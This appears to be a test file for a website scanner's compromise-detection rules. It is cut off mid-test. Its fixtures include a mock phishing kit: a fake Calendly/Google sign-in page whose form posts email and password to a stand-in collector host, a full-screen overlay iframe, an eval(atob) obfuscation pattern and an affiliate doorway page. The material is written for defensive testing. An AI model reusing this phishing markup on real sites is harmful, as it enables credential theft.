// integrity — Phase A compromise heuristics (issue #116).
//
// Fixtures model the real sydneyavspecialists incident:
//   - POSITIVE: a token-gated Calendly credential kit (off-theme standalone page
//     + obfuscated inline payload + #google-auth full-viewport overlay), and an
//     injected affiliate doorway post.
//   - NEGATIVE: a clean themed page from the SAME site (must NOT flag), and a
//     legit SaaS page that merely *mentions* Calendly as an integration (must NOT
//     trip brand-impersonation).
//
// The correlation gating is the crux: the kit page fires multiple signals → high
// severity (`fail`); the negatives fire zero or one → never `fail`.

import { describe, expect, test } from "bun:test";

import type { CheckResult } from "@squirrelscan/core-contracts";

import { parsePage } from "@squirrelscan/parser";

import { brandImpersonationRule } from "../src/integrity/brand-impersonation";
import { fakeAuthOverlayRule } from "../src/integrity/fake-auth-overlay";
import { obfuscatedScriptRule } from "../src/integrity/obfuscated-script";
import { orphanPageRule } from "../src/integrity/orphan-page";
import { seoDoorwayRule } from "../src/integrity/seo-doorway";
import { templateDiscontinuityRule } from "../src/integrity/template-discontinuity";
import {
  detectPageSignals,
  detectBrandImpersonation,
  detectObfuscatedScript,
  detectFakeAuthOverlay,
  detectSeoDoorway,
} from "../src/integrity/signals";
import type { ParsedPage, Rule, RuleContext, SiteData } from "../src/types";

const SITE = "https://sydneyavspecialists.com.au";

// ── Fixtures ─────────────────────────────────────────────────────────

// Shared theme markup: same stylesheet, same CDN host, nav + footer, body class.
function themed(title: string, body: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="https://cdn.sydneyav.com/theme/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <script src="https://cdn.sydneyav.com/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;--brand-font:Roboto;}</style>
  </head>
  <body class="wp-theme sydneyav home page-template">
    <nav class="main-nav"><a href="/">Home</a><a href="/services">Services</a><a href="/about">About</a></nav>
    <main>${body}</main>
    <footer class="site-footer"><img src="https://cdn.sydneyav.com/logo.png" alt="logo">© Sydney AV</footer>
  </body></html>`;
}

const CLEAN_BODY = `<p>${Array.from({ length: 240 }, (_, i) => `audiovisual hire word${i}`).join(" ")}</p>`;

// A genuinely off-brand obfuscated inline payload: large, high-entropy, eval +
// anti-tamper. Built from random-ish hex to push Shannon entropy high.
function obfuscatedPayload(): string {
  let s = 'var _0x1a2b=function(){return "the code has been tampered!";};eval(atob("';
  // ~8KB of base64-ish high-entropy chars
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  let seed = 1337;
  for (let i = 0; i < 8200; i++) {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    // Use the HIGH bits — low bits of an LCG have a short period (would collapse
    // to a near-constant char and tank the entropy we're trying to simulate).
    s += alphabet[(seed >> 16) % alphabet.length];
  }
  s += '"));String.fromCharCode(104,105);';
  return s;
}

// POSITIVE — the kit page: bare standalone doc (no theme), Calendly title +
// "Sign in with Google", off-origin form, full-viewport #google-auth iframe, and
// a large obfuscated inline script.
function kitPageHtml(): string {
  return `<!DOCTYPE html><html><head>
    <title>Discovery Call · Calendly (Updated)</title>
    <script>${obfuscatedPayload()}</script>
  </head>
  <body>
    <iframe id="google-auth" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:0" src="https://verify-account.tk/login"></iframe>
    <div>Sign in with Google to confirm your Calendly discovery call.</div>
    <form action="https://evil-collector.tk/grab" method="post">
      <input type="email" name="email">
      <input type="password" name="password">
      <button>Sign in</button>
    </form>
    <a href="https://accounts-google.tk/oauth">Sign in with Google</a>
  </body></html>`;
}

// POSITIVE — injected affiliate doorway post (themed enough to pass template, but
// off-topic keyword-stuffed body). Detected via doorway lexicon + thin/stuffed.
function doorwayPageHtml(): string {
  const stuffed = Array.from(
    { length: 40 },
    () => "clickfunnels kajabi affiliate sales funnel"
  ).join(" ");
  return themed(
    "Calendly ClickFunnels 2.0 (5 HELPFUL TIPS) - Best Sales Funnel",
    `<article><h1>Calendly ClickFunnels 2.0 affiliate review</h1><p>${stuffed}</p></article>`
  );
}

// NEGATIVE — legit SaaS integrations page that mentions Calendly. Themed, links
// to the real calendly.com, no credential surface.
function legitCalendlyPageHtml(): string {
  return themed(
    "Calendly Integration - Sydney AV Booking",
    `<article><h1>Book a call via our Calendly integration</h1>
     <p>${CLEAN_BODY}</p>
     <p>We use <a href="https://calendly.com/sydneyav">Calendly</a> to schedule discovery calls. Click below to book a call.</p>
     <a href="https://calendly.com/sydneyav/discovery">Schedule on Calendly</a></article>`
  );
}

// ── Helpers ──────────────────────────────────────────────────────────

function pageEntry(
  url: string,
  html: string,
  statusCode = 200
): SiteData["pages"][number] {
  return { url, statusCode, parsed: parsePage(html, url) };
}

function pageCtx(
  url: string,
  html: string,
  site?: SiteData
): RuleContext {
  const parsed = parsePage(html, url);
  return {
    page: { url, html, statusCode: 200, loadTime: 0, headers: {}, parsed },
    parsed,
    site,
    options: {},
  };
}

function siteCtx(pages: SiteData["pages"], opts?: {
  sitemapLocs?: string[];
  options?: Record<string, unknown>;
}): RuleContext {
  const site: SiteData = {
    baseUrl: SITE,
    pages,
    robotsTxt: null,
    sitemaps: opts?.sitemapLocs
      ? {
          discovered: [
            {
              url: `${SITE}/sitemap.xml`,
              type: "urlset",
              urls: opts.sitemapLocs.map((loc) => ({ loc })),
              childSitemaps: [],
              errors: [],
              urlCount: opts.sitemapLocs.length,
            },
          ],
          sources: { robotsTxt: [], commonLocations: [] },
          totalUrls: opts.sitemapLocs.length,
          orphanPages: [],
          missingPages: [],
          failed: [],
        }
      : null,
  };
  return {
    page: {
      url: pages[0]?.url ?? SITE,
      html: "",
      statusCode: 200,
      loadTime: 0,
      headers: {},
    },
    parsed: pages[0]?.parsed ?? ({} as ParsedPage),
    site,
    options: opts?.options ?? {},
  };
}

// Mirror the runner: apply the rule's optionsSchema defaults before running, so
// site rules see their default minPages/threshold (the runner does this via
// getRuleOptions; calling rule.run directly would otherwise leave options unset).
function run(rule: Rule, ctx: RuleContext): CheckResult[] {
  const schema = rule.meta.optionsSchema;
  const options = schema ? schema.parse(ctx.options ?? {}) : ctx.options;
  return (rule.run({ ...ctx, options }) as { checks: CheckResult[] }).checks;
}
function find(checks: CheckResult[], name: string): CheckResult | undefined {
  return checks.find((c) => c.name === name);
}

// Build a realistic site: 4 clean themed pages + the kit + the doorway.
function fullSitePages(): SiteData["pages"] {
  return [
    pageEntry(`${SITE}/`, themed("Home - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/services`, themed("Services - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/about`, themed("About - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/contact`, themed("Contact - Sydney AV", CLEAN_BODY)),
    pageEntry(`${SITE}/calendly?token=ey4m`, kitPageHtml()),
    pageEntry(`${SITE}/blog/calendly-clickfunnels-tips`, doorwayPageHtml()),
  ];
}

// ── Signal-level detectors ───────────────────────────────────────────

describe("integrity/signals — individual detectors", () => {
  test("kit page fires brand-impersonation, obfuscated-script, fake-auth-overlay", () => {
    const ctx = pageCtx(`${SITE}/calendly?token=ey4m`, kitPageHtml());
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
    expect(detectObfuscatedScript(ctx)).not.toBeNull();
    expect(detectFakeAuthOverlay(ctx)).not.toBeNull();
    const signals = detectPageSignals(ctx);
    expect(signals.size).toBeGreaterThanOrEqual(2);
  });

  test("doorway page fires seo-doorway", () => {
    const ctx = pageCtx(`${SITE}/blog/x`, doorwayPageHtml());
    expect(detectSeoDoorway(ctx)).not.toBeNull();
  });

  test("legit Calendly page fires NO brand-impersonation", () => {
    const ctx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml());
    expect(detectBrandImpersonation(ctx)).toBeNull();
  });

  test("clean themed page fires zero signals", () => {
    const ctx = pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY));
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("legit page mentioning Calendly fires zero signals", () => {
    const ctx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml());
    expect(detectPageSignals(ctx).size).toBe(0);
  });
});

// ── brand-impersonation rule (correlation gating) ────────────────────

describe("integrity/brand-impersonation", () => {
  test("kit page → fail (>=2 corroborating signals)", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/calendly`, kitPageHtml())
    );
    const c = find(checks, "brand-impersonation");
    expect(c?.status).toBe("fail");
    expect(c?.details?.escalated).toBe(true);
  });

  test("legit Calendly integration page → no finding", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())
    );
    expect(find(checks, "brand-impersonation")).toBeUndefined();
  });

  test("clean themed page → no finding", () => {
    const checks = run(
      brandImpersonationRule,
      pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))
    );
    expect(find(checks, "brand-impersonation")).toBeUndefined();
  });

  test("single brand signal alone → info, not fail", () => {
    // ONLY a brand-labeled off-brand "Sign in with Google" link — no overlay
    // iframe, no obfuscated script. Exactly one integrity signal → info.
    const html = `<!DOCTYPE html><html><head><title>Calendly Login</title></head>
      <body><p>Continue to your Calendly account.</p>
      <a href="https://accounts-google.tk/oauth">Sign in with Google</a></body></html>`;
    const ctx = pageCtx(`${SITE}/x`, html);
    const signals = detectPageSignals(ctx);
    expect(signals.size).toBe(1);
    const c = find(run(brandImpersonationRule, ctx), "brand-impersonation");
    expect(c?.status).toBe("info");
    expect(c?.details?.escalated).toBe(false);
  });
});

// ── obfuscated-script rule ───────────────────────────────────────────

describe("integrity/obfuscated-script", () => {
  test("kit page → fail (corroborated)", () => {
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, kitPageHtml())),
      "obfuscated-script"
    );
    expect(c?.status).toBe("fail");
  });

  test("clean themed page with normal scripts → no finding", () => {
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/about`, themed("About", CLEAN_BODY))),
      "obfuscated-script"
    );
    expect(c).toBeUndefined();
  });

  test("lone obfuscated script (no other signals) → info", () => {
    const html = `<!DOCTYPE html><html><head><title>Page</title>
      <script>${obfuscatedPayload()}</script></head>
      <body><p>${CLEAN_BODY}</p></body></html>`;
    const c = find(
      run(obfuscatedScriptRule, pageCtx(`${SITE}/x`, html)),
      "obfuscated-script"
    );
    expect(c?.status).toBe("info");
  });
});

// ── fake-auth-overlay rule ───────────────────────────────────────────

describe("integrity/fake-auth-overlay", () => {
  test("kit page full-viewport #google-auth iframe → fail (corroborated)", () => {
    const c = find(
      run(fakeAuthOverlayRule, pageCtx(`${SITE}/calendly`, kitPageHtml())),
      "fake-auth-overlay"
    );
    expect(c?.status).toBe("fail");
  });

  test("normal fixed cookie-banner iframe → no finding", () => {
    const html = themed(
      "Home",
      `${CLEAN_BODY}<iframe style="position:fixed;bottom:0;left:0;width:100%;height:60px;z-index:5" src="https://cdn.sydneyav.com/cookie.html"></iframe>`
    );
    const c = find(
      run(fakeAuthOverlayRule, pageCtx(`${SITE}/`, html)),
      "fake-auth-overlay"
    );
    expect(c).toBeUndefined();
  });
});

// ── seo-doorway rule ─────────────────────────────────────────────────

describe("integrity/seo-doorway", () => {
  test("doorway page → finding", () => {
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/blog/x`, doorwayPageHtml())),
      "seo-doorway"
    );
    expect(c).toBeDefined();
  });

  test("legit Calendly page → no doorway finding", () => {
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml())),
      "seo-doorway"
    );
    expect(c).toBeUndefined();
  });

  test("single 'affiliate disclosure' mention → no finding", () => {
    const html = themed(
      "Honest Audiovisual Gear Review",
      `<article><h1>AV gear review</h1><p>${CLEAN_BODY}</p>
       <p>This post contains affiliate links (affiliate disclosure).</p></article>`
    );
    const c = find(
      run(seoDoorwayRule, pageCtx(`${SITE}/blog/review`, html)),
      "seo-doorway"
    );
    expect(c).toBeUndefined();
  });
});

// ── template-discontinuity rule (site-scope) ─────────────────────────

describe("integrity/template-discontinuity", () => {
  test("kit page diverges from theme + carries signals → fail", () => {
    const ctx = siteCtx(fullSitePages());
    const c = find(run(templateDiscontinuityRule, ctx), "template-discontinuity");
    expect(c?.status).toBe("fail");
    const outliers = (c?.details?.outliers as { url: string }[]) ?? [];
    expect(outliers.some((o) => o.url.includes("/calendly"))).toBe(true);
  });

  test("all-themed site → pass", () => {
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
    ];
    const c = find(
      run(templateDiscontinuityRule, siteCtx(pages)),
      "template-discontinuity"
    );
    expect(c?.status).toBe("pass");
  });

  test("too few pages → skipped", () => {
    const pages = [pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY))];
    const c = find(
      run(templateDiscontinuityRule, siteCtx(pages)),
      "template-discontinuity"
    );
    expect(c?.status).toBe("skipped");
  });
});

// ── orphan-page rule (site-scope) ────────────────────────────────────

describe("integrity/orphan-page", () => {
  test("hidden kit page (no sitemap entry, no inbound links) + signals → fail", () => {
    // Sitemap lists only the legit pages; kit page is absent + nothing links it.
    const pages = fullSitePages();
    const sitemapLocs = [
      `${SITE}/`,
      `${SITE}/services`,
      `${SITE}/about`,
      `${SITE}/contact`,
    ];
    const c = find(
      run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
      "orphan-page"
    );
    expect(c?.status).toBe("fail");
    const items = (c?.items ?? []).map((i) => i.id);
    expect(items.some((u) => u.includes("/calendly"))).toBe(true);
  });

  test("all pages linked + in sitemap → pass", () => {
    const home = themed(
      "Home",
      `${CLEAN_BODY}<a href="/services">Services</a><a href="/about">About</a>`
    );
    const pages = [
      pageEntry(`${SITE}/`, home),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
    ];
    const sitemapLocs = [`${SITE}/`, `${SITE}/services`, `${SITE}/about`];
    const c = find(
      run(orphanPageRule, siteCtx(pages, { sitemapLocs })),
      "orphan-page"
    );
    expect(c?.status).toBe("pass");
  });

  // No sitemap discovered → absence-from-sitemap is meaningless, so the rule
  // falls back to the zero-inbound-links criterion alone. A hidden kit page
  // carrying signals still escalates; the homepage is exempt.
  test("no sitemap: hidden kit page (zero inbound) + signals → fail", () => {
    const home = themed(
      "Home",
      `${CLEAN_BODY}<a href="/services">Services</a><a href="/about">About</a>`
    );
    const pages = [
      pageEntry(`${SITE}/`, home),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/calendly?token=ey4m`, kitPageHtml()), // hidden, signals
    ];
    const checks = run(orphanPageRule, siteCtx(pages)); // no sitemapLocs → hasSitemap=false
    const c = find(checks, "orphan-page");
    expect(c?.status).toBe("fail");
    expect((c?.items ?? []).some((i) => i.id.includes("/calendly"))).toBe(true);
    expect(c?.details?.hasSitemap).toBe(false);
  });
});

// ── end-to-end: the incident would be caught, negatives spared ───────

describe("integrity — incident corpus end-to-end", () => {
  test("kit page produces at least 3 fail-level integrity findings across rules", () => {
    const site = siteCtx(fullSitePages(), {
      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
    }).site!;
    const kitCtx = pageCtx(`${SITE}/calendly?token=ey4m`, kitPageHtml(), site);

    const pageFindings = [
      ...run(brandImpersonationRule, kitCtx),
      ...run(obfuscatedScriptRule, kitCtx),
      ...run(fakeAuthOverlayRule, kitCtx),
    ].filter((c) => c.status === "fail");
    expect(pageFindings.length).toBeGreaterThanOrEqual(3);

    // Site-scope rules also flag it.
    const siteCtxFull = siteCtx(fullSitePages(), {
      sitemapLocs: [`${SITE}/`, `${SITE}/services`, `${SITE}/about`, `${SITE}/contact`],
    });
    expect(
      find(run(templateDiscontinuityRule, siteCtxFull), "template-discontinuity")
        ?.status
    ).toBe("fail");
    expect(
      find(run(orphanPageRule, siteCtxFull), "orphan-page")?.status
    ).toBe("fail");
  });

  test("legit Calendly page + clean pages produce NO fail-level integrity findings", () => {
    const site = siteCtx([
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/integrations`, legitCalendlyPageHtml()),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
    ]).site!;
    const legitCtx = pageCtx(`${SITE}/integrations`, legitCalendlyPageHtml(), site);

    const allFindings = [
      ...run(brandImpersonationRule, legitCtx),
      ...run(obfuscatedScriptRule, legitCtx),
      ...run(fakeAuthOverlayRule, legitCtx),
      ...run(seoDoorwayRule, legitCtx),
    ];
    expect(allFindings.filter((c) => c.status === "fail").length).toBe(0);
    expect(allFindings.filter((c) => c.status === "info").length).toBe(0);
  });
});

// ── false-positive regressions (codex review findings) ───────────────

describe("integrity — false-positive regressions", () => {
  // Finding 1: only the CREDENTIAL SURFACE destinations count — an unrelated
  // footer/social link must not be read as where credentials go.
  test("legit 'Sign in with Google' page + footer Twitter link → no brand-impersonation", () => {
    const html = themed(
      "Sign in - Sydney AV",
      `<article><h1>Sign in</h1><p>${CLEAN_BODY}</p>
       <a href="https://accounts.google.com/o/oauth2/v2/auth?client_id=x">Sign in with Google</a>
       <a href="https://twitter.com/sydneyav">Follow us on Twitter</a>
       <a href="https://linkedin.com/company/sydneyav">LinkedIn</a></article>`
    );
    const ctx = pageCtx(`${SITE}/login`, html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(
      find(run(brandImpersonationRule, ctx), "brand-impersonation")
    ).toBeUndefined();
  });

  // Finding 1c: a SaaS marketing page whose "Sign in" points at its OWN app
  // subdomain (same registrable domain) while mentioning Calendly must not flag.
  test("SaaS page: 'Sign in' → app subdomain + Calendly mention → no brand-impersonation", () => {
    const html = `<!DOCTYPE html><html><head><title>Acme - Scheduling that syncs with Calendly</title>
      <link rel="canonical" href="https://www.acme.com/features/calendly"></head>
      <body><h1>Calendly integration</h1>
      <p>Acme syncs your bookings with Calendly. Sign in to get started.</p>
      <a href="https://app.acme.com/login">Sign in</a>
      <a href="https://calendly.com/integrations/acme">View on Calendly</a></body></html>`;
    const ctx = pageCtx("https://www.acme.com/features/calendly", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  // Finding 1b: a self-hosted login form (password posts to own origin) that
  // offers Google SSO to accounts.google.com must not flag.
  test("self-hosted login form + real Google SSO → no brand-impersonation", () => {
    const html = themed(
      "Account Login - Sydney AV",
      `<h1>Log in to your account</h1>
       <form action="/auth/session" method="post">
         <input type="email" name="email"><input type="password" name="password">
         <button>Log in</button>
       </form>
       <a href="https://accounts.google.com/o/oauth2/auth">Sign in with Google</a>`
    );
    expect(detectBrandImpersonation(pageCtx(`${SITE}/login`, html))).toBeNull();
  });

  // Finding 2: a legitimate full-page app-shell iframe pointing at the SAME
  // origin (no auth identifier, no off-self src) must not fire fake-auth-overlay.
  test("legit full-page self-hosted app-shell iframe → no fake-auth-overlay", () => {
    const html = themed(
      "App - Sydney AV",
      `${CLEAN_BODY}<iframe id="app-shell" class="embed" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000;border:0" src="https://sydneyavspecialists.com.au/app/embed"></iframe>`
    );
    const ctx = pageCtx(`${SITE}/app`, html);
    expect(detectFakeAuthOverlay(ctx)).toBeNull();
    expect(
      find(run(fakeAuthOverlayRule, ctx), "fake-auth-overlay")
    ).toBeUndefined();
  });

  // Finding 2b: off-self full-page iframe WITHOUT page auth copy and WITHOUT an
  // auth identifier (e.g. a full-screen video/map embed) must not fire.
  test("off-self full-page embed without auth intent → no fake-auth-overlay", () => {
    const html = themed(
      "Virtual Tour - Sydney AV",
      `${CLEAN_BODY}<iframe id="tour" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:0" src="https://player.vimeo.com/video/12345"></iframe>`
    );
    expect(detectFakeAuthOverlay(pageCtx(`${SITE}/tour`, html))).toBeNull();
  });

  // Finding 3: a legitimate off-theme landing page (template outlier with NO
  // page-level compromise signals) must be reported as `info` review-only, NOT
  // folded into a high-severity `fail`.
  test("legit off-theme landing page → template-discontinuity info, not fail", () => {
    // 4 themed pages + 1 off-theme but otherwise-clean landing page.
    const landing = `<!DOCTYPE html><html><head><title>Special Promo Landing</title>
      <link rel="stylesheet" href="https://promo-cdn.example.com/lp.css"></head>
      <body class="lp-bare"><h1>Limited offer</h1><p>${CLEAN_BODY}</p></body></html>`;
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", CLEAN_BODY)),
      pageEntry(`${SITE}/services`, themed("Services", CLEAN_BODY)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/contact`, themed("Contact", CLEAN_BODY)),
      pageEntry(`${SITE}/promo`, landing),
    ];
    const checks = run(templateDiscontinuityRule, siteCtx(pages));
    // No fail-level finding (the outlier carries no page-level signals).
    expect(checks.find((c) => c.name === "template-discontinuity")).toBeUndefined();
    const review = find(checks, "template-discontinuity-review");
    expect(review?.status).toBe("info");
    expect((review?.items ?? []).some((i) => i.id.includes("/promo"))).toBe(true);
  });

  // Finding 3b: a hidden page with no compromise signals → orphan-page-review
  // info, not fail.
  test("legit hidden page (no signals) → orphan-page info, not fail", () => {
    const pages = [
      pageEntry(`${SITE}/`, themed("Home", `${CLEAN_BODY}<a href="/about">About</a>`)),
      pageEntry(`${SITE}/about`, themed("About", CLEAN_BODY)),
      pageEntry(`${SITE}/unlisted`, themed("Unlisted Page", CLEAN_BODY)), // hidden, clean
    ];
    const sitemapLocs = [`${SITE}/`, `${SITE}/about`];
    const checks = run(orphanPageRule, siteCtx(pages, { sitemapLocs }));
    expect(checks.find((c) => c.name === "orphan-page")).toBeUndefined();
    const review = find(checks, "orphan-page-review");
    expect(review?.status).toBe("info");
  });
});

// ── multi-label TLD self/same-site detection (#144) ──────────────────
//
// The naive "last two labels" registrable-domain proxy collapsed multi-label
// public suffixes (`com.au`, `co.uk`, …) to the suffix itself, so EVERY host on
// such a TLD looked like the site's own surface and brand-impersonation was
// suppressed — precisely on the `.com.au` class of domain the incident
// (`sydneyavspecialists.com.au`) belongs to. The registrable domain (eTLD+1) is
// now resolved against the real Public Suffix List (via `tldts`), which handles
// every ccTLD second-level AND deeper tiers (`nsw.edu.au`, …) the earlier curated
// ~50-entry table could not represent.
describe("integrity/brand-impersonation — multi-label TLDs (#144)", () => {
  // A page whose brand-labeled "Sign in" control posts to an UNRELATED
  // registrable domain that happens to share the same multi-label public suffix.
  function offBrandPage(siteHost: string, attackerHost: string): string {
    return `<!DOCTYPE html><html><head>
      <title>Discovery Call · Calendly</title></head>
      <body>
      <p>Sign in with Google to confirm your Calendly discovery call.</p>
      <a href="https://${attackerHost}/oauth">Sign in with Google</a>
      </body></html>`;
  }

  test(".com.au site → off-brand .com.au sign-in IS flagged (no suffix suppression)", () => {
    // victim.com.au vs evil.com.au share `com.au` but are different sites — the
    // old code returned `com.au` for both → suppressed. Now flagged.
    const ctx = pageCtx(
      "https://victim.com.au/login",
      offBrandPage("victim.com.au", "evil.com.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.brand).toBe("Google");
    expect(hit?.reason).toContain("evil.com.au");
  });

  test(".co.uk site → off-brand .co.uk sign-in IS flagged", () => {
    const ctx = pageCtx(
      "https://victim.co.uk/login",
      offBrandPage("victim.co.uk", "phish.co.uk")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("phish.co.uk");
  });

  test("incident TLD: sydneyavspecialists.com.au → off-brand .com.au flagged", () => {
    // The exact TLD class the feature exists for: a kit on a .com.au site
    // pointing its Calendly "Sign in" at a different .com.au attacker host.
    const ctx = pageCtx(
      `${SITE}/calendly`,
      offBrandPage("sydneyavspecialists.com.au", "calendly-secure.com.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("calendly-secure.com.au");
  });

  // The same-site control is BRAND-LABELED ("Sign in with Google") and targets a
  // sibling subdomain on the SAME registrable domain — this is the path
  // `isSelfOrSameSite` must spare. A bare "Sign in" would be filtered out by
  // `credentialDestinations` before the self-check runs and wouldn't test it.
  test("genuine same-registrable subdomain on .com.au → NOT flagged (no FP)", () => {
    // www.victim.com.au → app.victim.com.au is the site's own surface: same
    // registrable domain (victim.com.au), must still be treated as self.
    const html = `<!DOCTYPE html><html><head>
      <title>Victim Co - Scheduling that syncs with Calendly</title>
      <link rel="canonical" href="https://www.victim.com.au/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.victim.com.au/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.victim.com.au/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("same-registrable subdomain on .co.uk → NOT flagged (no FP)", () => {
    const html = `<!DOCTYPE html><html><head>
      <title>Acme UK - Calendly scheduling</title>
      <link rel="canonical" href="https://www.acme.co.uk/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.acme.co.uk/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.acme.co.uk/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  test("ordinary .com same-registrable subdomain still treated as self", () => {
    // Regression guard for the gTLD path the fix must not break.
    const html = `<!DOCTYPE html><html><head>
      <title>Acme - Calendly scheduling</title>
      <link rel="canonical" href="https://www.acme.com/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.acme.com/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.acme.com/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
  });

  // FQDN/trailing-dot form must normalize the same as the bare host: an off-brand
  // `evil.com.au.` from `victim.com.au.` is still cross-site → flagged.
  test("trailing-dot FQDN hosts normalize → off-brand .com.au still flagged", () => {
    const ctx = pageCtx(
      "https://victim.com.au./login",
      offBrandPage("victim.com.au.", "evil.com.au.")
    );
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
  });

  // `gov.au` IS in the suffix table, so the COMMON two-tier case keeps unrelated
  // registrable domains distinct: `treasury.gov.au` vs `health.gov.au` → flagged.
  test("two-tier gov suffix (.gov.au) keeps unrelated domains distinct → flagged", () => {
    const ctx = pageCtx(
      "https://treasury.gov.au/login",
      offBrandPage("treasury.gov.au", "health.gov.au")
    );
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
    expect(detectBrandImpersonation(ctx)?.reason).toContain("health.gov.au");
  });

  // Deeper THREE-tier PSL suffixes (`*.nsw.edu.au`) are now resolved correctly:
  // `nsw.edu.au` is a real public suffix, so unrelated schools beneath it are
  // distinct registrable domains and the off-brand sign-in IS flagged. The
  // curated table could not represent this tier and over-collapsed it (suppressed
  // the guess) — this asserts the PSL fix closes that gap.
  test("deeper three-tier suffix (.nsw.edu.au) → off-brand sibling IS flagged", () => {
    const ctx = pageCtx(
      "https://school-a.nsw.edu.au/login",
      offBrandPage("school-a.nsw.edu.au", "school-b.nsw.edu.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("school-b.nsw.edu.au");
  });

  // A ccTLD second-level the curated ~50-entry table never listed (`com.pl`).
  // The naive proxy AND the curated table both collapsed it to the suffix; the
  // PSL knows it, so unrelated `com.pl` registrable domains are now distinct.
  test("ccTLD absent from old curated table (.com.pl) → off-brand flagged", () => {
    const ctx = pageCtx(
      "https://victim.com.pl/login",
      offBrandPage("victim.com.pl", "evil.com.pl")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("evil.com.pl");
  });

  test("same-registrable subdomain on .com.pl → NOT flagged (no FP)", () => {
    const html = `<!DOCTYPE html><html><head>
      <title>Victim PL - Calendly scheduling</title>
      <link rel="canonical" href="https://www.victim.com.pl/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.victim.com.pl/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.victim.com.pl/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  // PRIVATE-section suffix (free-hosting platform). With allowPrivateDomains the
  // two tenants are DISTINCT registrable domains, so a kit on one blogspot site
  // posting brand-labeled creds to another is flagged — the common phishing-on-
  // free-hosting case ICANN-only resolution would suppress.
  test("private-suffix tenants (.blogspot.com) → cross-tenant off-brand flagged", () => {
    const ctx = pageCtx(
      "https://victim.blogspot.com/login",
      offBrandPage("victim.blogspot.com", "evil.blogspot.com")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("evil.blogspot.com");
  });

  // Null-fallback path: tldts returns null for IP literals (and localhost, bare
  // suffixes, single-label hosts), so `registrableDomain` falls back to the
  // normalized host. Two DIFFERENT IPs must stay distinct (not collapse to a
  // shared same-site value) — pins the fallback against a future tldts change.
  test("IP-literal hosts use host fallback → distinct IPs are off-brand (flagged)", () => {
    const ctx = pageCtx(
      "https://203.0.113.5/login",
